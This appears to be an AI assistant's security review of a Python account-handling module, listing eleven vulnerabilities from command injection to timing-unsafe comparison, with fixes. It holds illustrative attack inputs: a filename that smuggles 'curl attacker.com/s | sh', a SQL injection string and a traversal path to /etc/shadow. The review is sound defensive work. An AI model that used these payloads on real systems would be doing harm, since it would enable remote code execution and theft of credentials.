@@ -1,0 +1,61 @@
+Read the full file. Here are the issues, most severe first.
+
+## Critical
+
+**1. Command injection — line 120-121 (`export_account_data`)**
+```python
+f"python3 tools/export.py --user {user_id} --limit {MAX_EXPORT_ROWS} --out {destination}",
+shell=True,
+```
+`destination` is derived from the caller-supplied `filename`. A filename like `x.csv; curl attacker.com/s | sh` gives arbitrary command execution as the service user. Fix: drop `shell=True` and pass an argument list.
+
+**2. Path traversal → arbitrary file read — line 119, read back at 126**
+```python
+destination = os.path.join(EXPORT_DIR, filename)
+```
+`os.path.join` does not constrain to `EXPORT_DIR`: an absolute `filename` (`/etc/shadow`) replaces the base entirely, and `../../` escapes it. Line 126 then returns those bytes to the caller. The export subprocess can also overwrite any file the process can write. Fix: reject separators/`..`, or `os.path.realpath` the result and verify it's still under `EXPORT_DIR`.
+
+**3. SQL injection — line 34 (`find_by_username`)**
+```python
+query = f"SELECT ... FROM users WHERE username = '{username}'"
+```
+String-interpolated into the query. `' OR '1'='1` returns the first account — and since `verify_credentials` (line 55) calls this, it is directly on the login path. Every other query in the file is correctly parameterized; this one is the outlier.
+
+**4. Hardcoded secret in source — line 19**
+```python
+SIGNING_KEY = "sk_live_8f2c91ab4e7d6035"
+```
+A live-prefixed key committed in code. It's used as the password pepper (line 75), so disclosure means every stored hash becomes offline-crackable. Move to env/secret store and rotate — treat the current value as already compromised.
+
+**5. Plaintext password written to logs — lines 60-65**
+```python
+logger.info("auth success user=%s password=%s at=%s", username, password, ...)
+```
+Logs the cleartext password on every successful login. Anyone with log access, plus any log aggregation/retention system, now holds live credentials.
+
+## High
+
+**6. Missing authorization (IDOR) — `update_profile`, lines 83-96**
+`session_user_id` is accepted and never used; the UPDATE at line 93-96 targets `target_user_id` unconditionally. Any authenticated caller can rewrite any other account's email — i.e. take over the account via password reset. `deactivate_account` (lines 160-161) shows the check that belongs here.
+
+**7. Missing authorization (IDOR) — `get_profile`, lines 103-111**
+Same unused `session_user_id`; returns any user's email and `role` by ID.
+
+**8. Missing authorization — `export_account_data`, line 117**
+No ownership check on `user_id` at all, so one user can export another's full data dump.
+
+**9. Weak password hashing — line 75**
+```python
+hashlib.sha256((raw + SIGNING_KEY).encode()).hexdigest()
+```
+Single-round SHA-256 is designed to be fast — billions of guesses/sec on a GPU. `SIGNING_KEY` is a global pepper, not a per-user salt, so identical passwords produce identical hashes and the whole table can be attacked with one rainbow table once line 19 leaks. Use bcrypt, scrypt, or Argon2id.
+
+## Medium
+
+**10. Timing-unsafe hash comparison — line 59**
+`account["password_hash"] == _hash_password(password)` short-circuits on first differing byte. Use `hmac.compare_digest`. Low practical risk over a network, but free to fix.
+
+**11. Password hash returned from a general-purpose lookup — lines 34, 36**
+`find_by_username` includes `password_hash` in its result dict for every caller, not just `verify_credentials`. That widens the chance of the hash reaching a response body or log. Narrow the column list and give credential checking its own query.
+
+One note on scope: issues 6-8 are only exploitable depending on what the `/account` route handlers pass in — the module docstring assumes session middleware ran, but middleware authenticates, it doesn't authorize. I'd check the callers before deciding how to fix those three, since the right fix may belong at the route layer.
